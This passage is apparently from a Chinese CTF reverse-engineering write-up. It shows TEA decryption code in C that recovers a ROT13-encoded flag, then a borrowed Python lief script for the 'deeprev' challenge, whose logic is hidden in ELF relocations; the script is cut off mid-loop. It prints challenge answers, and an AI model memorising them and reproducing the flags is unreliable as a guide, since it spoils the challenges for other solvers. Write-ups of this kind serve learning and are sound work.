        v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);  
        sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; delta;  
    }                                              &lt;span style=&#34;color:#75715e&#34;&gt;/* end cycle */&lt;/span&gt;  
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;  
}  
  
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()  
{  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1570024068u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;351937696u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;727056912u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3063668041u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2867849940u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1267528902u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;159365321u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3052163538u&lt;/span&gt;},k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0x33323130&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37363534&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62613938&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66656463&lt;/span&gt;};  
    &lt;span style=&#34;color:#75715e&#34;&gt;// v为要加密的数据是两个32位无符号整数  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;加密后的数据：%u %u&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);  
    decrypt(v, k);  
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, k);  
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, k);  
    decrypt(v &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, k);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&amp;#34;&lt;/span&gt;, x[i]);
    }  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;  
}  
&lt;span style=&#34;color:#75715e&#34;&gt;// synt{Vg_Vf_A0g_guNg_zHpu_unEqre}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果进行rot13即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;flag{It_Is_N0t_thAt_mUch_haRder}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;deeprev&#34;&gt;deeprev&lt;/h2&gt;
&lt;p&gt;这道题一开始找不到逻辑，后来在 check 下断点，断在了 ld 中，看一下各个段的大小，发现relo部分很大，说明逻辑应该藏在了链接过程中&lt;/p&gt;
&lt;p&gt;后来发现是仿照 google ctf eldar 那题的，直接借用别人的脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; lief
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; collections &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; namedtuple
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; dataclasses &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; dataclass

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lief&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./deeprev&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to_sym&lt;/span&gt;(name):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(name) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ord(name[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])

Rel &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REL&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dst&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;val&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ridx&amp;#39;&lt;/span&gt;])
Copy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CPY&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dst&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;symbol&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ridx&amp;#39;&lt;/span&gt;])
R64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;R64&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dst&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;symbol&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;addend&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ridx&amp;#39;&lt;/span&gt;])
R32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;R32&amp;#39;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dst&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;symbol&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;addend&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ridx&amp;#39;&lt;/span&gt;])

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Symbol&lt;/span&gt;(object):
    idx: int

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;idx&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Reloc&lt;/span&gt;(object):
    idx: int

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;idx&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Ref&lt;/span&gt;(object):

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;val&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SymAddr&lt;/span&gt;(object):
    sym: Symbol
    field: str

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;field&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RelocAddr&lt;/span&gt;(object):
    reloc: Reloc
    field: str

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reloc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;field&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vaddr&lt;/span&gt;(self):
        off &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        print(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;field)
        &lt;span style=&#34;color:#75715e&#34;&gt;# match self.field:&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#    case &amp;#39;r_address&amp;#39;: off = 0&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#    case &amp;#39;r_info&amp;#39;: off = 8&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;#    case &amp;#39;r_addend&amp;#39;: off = 16&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;reloc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;idx &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; off &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rela&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address

&lt;span style=&#34;color:#a6e22e&#34;&gt;@dataclass&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FlagAddr&lt;/span&gt;(object):
    idx: int

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;idx&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;

BaseAddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;baseaddr&amp;#39;&lt;/span&gt;, [])
CheckAddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; namedtuple(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;check&amp;#39;&lt;/span&gt;, [])

rela &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [x &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sections &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.rela.dyn&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
dynsym &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [x &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sections &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.dynsym&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;format_addr&lt;/span&gt;(addr: int):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; rela&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; rela&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; rela&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size):
        offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; rela&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address
        r_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (offset &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)
        r_rem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; offset &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; RelocAddr(Reloc(r_offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r_address&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; RelocAddr(Reloc(r_offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r_info&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; RelocAddr(Reloc(r_offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r_addend&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; RelocAddr(Reloc(r_offset), r_rem)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; dynsym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address
          &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; dynsym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dynsym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size
          ):
        offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; dynsym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;virtual_address
        r_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (offset &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)
        r_rem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; offset &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; SymAddr(Symbol(r_offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;st_name&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Symbol(r_offset)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; r_rem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; SymAddr(Symbol(r_offset), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;st_size&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; SymAddr(Symbol(r_offset), r_rem)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x404040&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x404040&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;:
        off &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x404040&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; FlagAddr(off)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804000&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; BaseAddr()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x404064&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; CheckAddr()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; addr

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(b) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; list:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[*] Loading relocations...&amp;#39;&lt;/span&gt;)
    relocs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;relocations)

    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[*] Parsing...&amp;#39;&lt;/span&gt;)
    instructions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, len(relocs)):
        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; relocs[i]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;type &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            instructions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(
                R64(format_addr(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address), to_sym(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbol&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name), format_addr(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addend), i))
